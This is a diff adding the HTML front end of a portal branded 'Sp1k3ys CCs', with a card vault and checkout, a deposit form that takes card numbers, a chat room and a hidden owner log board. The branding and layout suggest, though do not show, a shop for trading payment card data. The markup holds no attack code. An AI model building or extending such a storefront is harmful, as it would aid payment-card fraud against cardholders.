@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sp1k3ys CCs - Secure Portal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen">
+        <div class="laser-core"></div>
+        <div class="explosion-flash"></div>
+        <h1 class="loading-title">SP1K3YS CCS</h1>
+        <p class="loading-subtitle">Initializing Secure Environment...</p>
+    </div>
+
+    <div class="cosmic-background">
+        <div class="stars"></div>
+        <div class="meteor-shower"></div>
+    </div>
+
+    <header class="app-header">
+        <div class="logo-area">
+            <span class="rainbow-watermark">Sp1k3ys CCs</span>
+        </div>
+        <div class="header-controls">
+            <span id="live-clock">00:00:00</span>
+            <button id="perf-toggle" class="glass-btn">Perf: High</button>
+        </div>
+    </header>
+
+    <main class="app-container">
+        <aside class="sidebar glass-panel">
+            <h2>Navigation</h2>
+            <nav>
+                <button class="nav-btn active" data-tab="dashboard">Dashboard</button>
+                <button class="nav-btn" data-tab="vault">Card Vault</button>
+                <button class="nav-btn" data-tab="deposit">Deposit & Funds</button>
+                <button class="nav-btn" data-tab="chat">Chat Room</button>
+                <button class="nav-btn" data-tab="owner" id="owner-tab-btn" style="display:none;">Owner Board</button>
+            </nav>
+        </aside>
+
+        <section class="content-viewport">
+            <div id="tab-dashboard" class="tab-content active">
+                <h2>Welcome Back</h2>
+                <div class="metrics-grid">
+                    <div class="metric-card glass-panel">
+                        <h3>Available Balance</h3>
+                        <p id="user-balance">$0.00</p>
+                    </div>
+                    <div class="metric-card glass-panel">
+                        <h3>Active Cards</h3>
+                        <p id="active-cards-count">0</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-vault" class="tab-content">
+                <h2>Card Vault & Checkout</h2>
+                <div id="card-gallery" class="card-gallery"></div>
+            </div>
+
+            <div id="tab-deposit" class="tab-content">
+                <h2>Secure Deposit</h2>
+                <div class="deposit-box glass-panel">
+                    <p>Select card & verify balance before depositing funds.</p>
+                    <input type="text" id="deposit-card-input" placeholder="Enter Card Number (Last 4 / Full)" class="glass-input">
+                    <input type="number" id="deposit-amount-input" placeholder="Amount ($)" class="glass-input">
+                    <button id="submit-deposit-btn" class="glass-btn primary">Process Secure Deposit</button>
+                </div>
+            </div>
+
+            <div id="tab-chat" class="tab-content">
+                <h2>Chat Room</h2>
+                <div class="chat-container glass-panel">
+                    <div id="chat-messages" class="chat-messages"></div>
+                    <div class="chat-input-area">
+                        <input type="text" id="chat-input" placeholder="Type message..." class="glass-input">
+                        <button id="chat-send-btn" class="glass-btn">Send</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-owner" class="tab-content">
+                <h2>Owner Dashboard</h2>
+                <div id="owner-logs" class="owner-logs glass-panel"></div>
+            </div>
+        </section>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
